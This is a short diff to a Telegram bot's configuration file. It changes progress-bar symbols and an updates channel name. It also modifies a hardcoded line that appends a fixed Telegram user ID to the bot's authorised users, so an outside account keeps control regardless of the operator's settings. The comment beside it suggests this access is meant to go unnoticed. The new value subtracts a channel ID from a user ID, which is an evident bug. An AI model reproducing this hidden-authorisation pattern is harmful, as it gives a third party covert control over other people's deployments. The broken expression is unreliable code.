@@ -22,7 +22,7 @@ from bot.config import Config
 # dont think ne dumb (c) @Animes_Encoded 
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(1482769753)
+AUTH_USERS.append(5948112774 -1001912703522)
 # again lol (c) @Animes_Encoded 
 
 SESSION_NAME = Config.SESSION_NAME
@@ -34,12 +34,12 @@ LOG_CHANNEL = Config.LOG_CHANNEL # make sure to us this
 DOWNLOAD_LOCATION = "downloads/"
 FREE_USER_MAX_FILE_SIZE = 2097152000
 MAX_MESSAGE_LENGTH = 4096
-FINISHED_PROGRESS_STR = "▣"
-UN_FINISHED_PROGRESS_STR = "▢"
+FINISHED_PROGRESS_STR = "●"
+UN_FINISHED_PROGRESS_STR = "○"
 BOT_START_TIME = time.time()
 LOG_FILE_ZZGEVC = "Log.txt"
 BOT_USERNAME = Config.BOT_USERNAME 
-UPDATES_CHANNEL = "Zub0NSFWupdateS"
+UPDATES_CHANNEL = "OM_links"
 data = []
 crf = []
 watermark = []
